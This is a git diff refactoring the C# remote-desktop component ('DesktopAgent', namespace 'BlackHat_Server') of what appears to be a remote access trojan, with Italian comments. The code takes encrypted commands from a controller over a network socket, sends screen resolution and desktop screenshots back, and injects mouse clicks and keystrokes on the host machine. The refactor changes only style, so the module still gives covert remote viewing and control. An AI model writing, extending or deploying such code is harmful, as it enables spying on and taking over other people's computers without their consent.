@@ -1,20 +1,18 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
+﻿using System.Drawing;
 using System.Net.Sockets;
+using System.Threading;
 using System.Windows.Forms;
-using System.Drawing;
 
 namespace BlackHat_Server
 {
-    class DesktopAgent
+    internal class DesktopAgent
     {
-        NetworkStream desktopNetwork;
-        Size s = SystemInformation.PrimaryMonitorSize;
+        private readonly NetworkStream desktopNetwork;
 
-        MsgFileManager mfm;
-        MsgManager mm;
-        
+        private readonly MsgFileManager mfm;
+        private readonly MsgManager mm;
+        private Size s = SystemInformation.PrimaryMonitorSize;
+
 
         public DesktopAgent(NetworkStream ctor_Stream)
         {
@@ -25,7 +23,7 @@ namespace BlackHat_Server
 
         public void StartDesktopListener()
         {
-            System.Threading.Thread t = new System.Threading.Thread(RemoteDesktopListener);
+            var t = new Thread(RemoteDesktopListener);
             t.IsBackground = true;
             t.Start();
         }
@@ -35,32 +33,32 @@ namespace BlackHat_Server
             //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
             //MsgManager mm = new MsgManager(desktopNetwork);
 
-            VirtualMouse vm = new VirtualMouse();
+            var vm = new VirtualMouse();
 
             while (ST_Client.Instance.isConnected)
             {
-                System.Threading.Thread.Sleep(10);
+                Thread.Sleep(10);
 
-                string cmd = mm.WaitForEncryMessageRicorsive(10000);
+                var cmd = mm.WaitForEncryMessageRicorsive(10000);
 
                 if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                 {
-                    string[] cmdSplit = cmd.Split('|');
+                    var cmdSplit = cmd.Split('|');
 
                     //SCREEN RES INFO
                     if (cmdSplit[0] == "RESOLUTION")
-                    {                        
-                        string msg = string.Format("{0}|{1}",s.Width,s.Height);
+                    {
+                        var msg = string.Format("{0}|{1}", s.Width, s.Height);
 
-                        mm.SendEncryMessage(msg,10000);
+                        mm.SendEncryMessage(msg, 10000);
                     }
 
                     //MOUSE CONTROL
                     if (cmdSplit[0] == "MOUSE")
                     {
-                        int t = int.Parse(cmdSplit[1]); // click singolo o doppio
-                        int w = int.Parse(cmdSplit[2]);
-                        int h = int.Parse(cmdSplit[3]);
+                        var t = int.Parse(cmdSplit[1]); // click singolo o doppio
+                        var w = int.Parse(cmdSplit[2]);
+                        var h = int.Parse(cmdSplit[3]);
 
                         if (t == 1)
                             vm.MouseClick(w, h);
@@ -70,26 +68,24 @@ namespace BlackHat_Server
                         // -1 == CLICK DESTRO
                         if (t == -1)
                             vm.MouseRightClick(w, h);
-                       
                     }
 
                     //MOUSE CONTROL
                     if (cmdSplit[0] == "KEYBOARD")
-                    {
                         try
                         {
-                            SendKeys.SendWait(@cmdSplit[1]);                          
+                            SendKeys.SendWait(cmdSplit[1]);
                         }
-                        catch {}
-                        
-                    }
+                        catch
+                        {
+                        }
 
                     // cmd3 = quality cmd1 = width cmd2 = heigh
                     if (cmdSplit[0] == "GET")
                     {
-                        int w = int.Parse(cmdSplit[1]);
-                        int h = int.Parse(cmdSplit[2]);
-                        int q = int.Parse(cmdSplit[3]);
+                        var w = int.Parse(cmdSplit[1]);
+                        var h = int.Parse(cmdSplit[2]);
+                        var q = int.Parse(cmdSplit[3]);
 
                         SendDesktop(w, h, q);
                     }
@@ -108,22 +104,19 @@ namespace BlackHat_Server
         }
 
 
-
-
         /// <summary>
-        /// Manda Desktop Preview
+        ///     Manda Desktop Preview
         /// </summary>
         private void SendDesktop(int _width, int _height, int _quality)
         {
             //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
             //MsgManager mm = new MsgManager(desktopNetwork);
 
-            ImageWorker iw = new ImageWorker();
-            byte[] dsk =  iw.DesktopImage(_width, _height, _quality);            
+            var iw = new ImageWorker();
+            var dsk = iw.DesktopImage(_width, _height, _quality);
 
             if (dsk != null)
                 mfm.SendEncryFileByte(dsk, 10000); // invio il desktop preview            
         }
-
     }
 }
